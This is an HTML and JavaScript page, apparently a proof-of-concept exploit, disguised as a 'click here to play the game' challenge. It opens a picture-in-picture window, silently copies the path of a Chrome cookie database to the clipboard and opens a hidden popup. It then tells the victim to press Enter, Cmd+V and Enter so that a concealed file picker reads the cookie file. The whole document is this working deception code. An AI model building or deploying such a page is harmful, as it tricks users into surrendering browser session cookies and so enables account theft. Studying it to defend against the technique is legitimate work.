<button onclick="start()">Click here to play the game</button>
<input id="upload" type="file" style="display:none" onchange="loadFile(this.files[0])">

<pre id="contents"></pre>

<script>
// Target path updated for the Mac Chrome Profile
const fileReadPath = "/Users/sean/Library/Application Support/Google/Chrome/Profile 27/Cookies";

async function loadFile(file) {
  // Resizes and moves the window to display the stolen content
  window.moveTo(0, 0);
  window.resizeTo(500, 500);
  alert(`Successfully read file:\n` + await (new Response(file)).text());
}

const pipOpen = async () => {
  // Opens the Document Picture-in-Picture window
  pipWindow = await documentPictureInPicture.requestWindow({
    width: 400,
    height: 400,
  });
  
  pipWindow.document.body.innerHTML = `
  <div style="font-family: sans-serif; text-align: center;">
    <h3>File Reading Challenge</h3>
    <button id="startBtn">Start Game</button>
    <div id="instructions"></div>
  </div>
  <script>
  // Silently copies the path to the clipboard
  function copyToClipboard(text) {
    const textarea = document.createElement("textarea");
    textarea.style.opacity = "0%";
    textarea.textContent = text;
    document.body.appendChild(textarea);
    textarea.select();
    document.execCommand("copy");
    document.body.removeChild(textarea);
  }

  document.getElementById('startBtn').onclick = () => {
    copyToClipboard("${fileReadPath}");
    // Opens the hidden trigger popup
    window.open("${document.location.href}", "popup-read", "popup,width=200,height=200");
    
    document.getElementById('instructions').innerHTML = 
      "<p style='color: red;'><b>To win:</b> Press Enter, then Cmd+V, then Enter!</p>";
  };
  <${'/'}script>
  `;
};

function start() {
  pipOpen();
}

// Logic for the hidden popup window
if (window.name == "popup-read") {
  // Any keypress triggers the file upload dialog
  document.body.onkeydown = () => {
    document.getElementById("upload").click();
  };
}
</script>
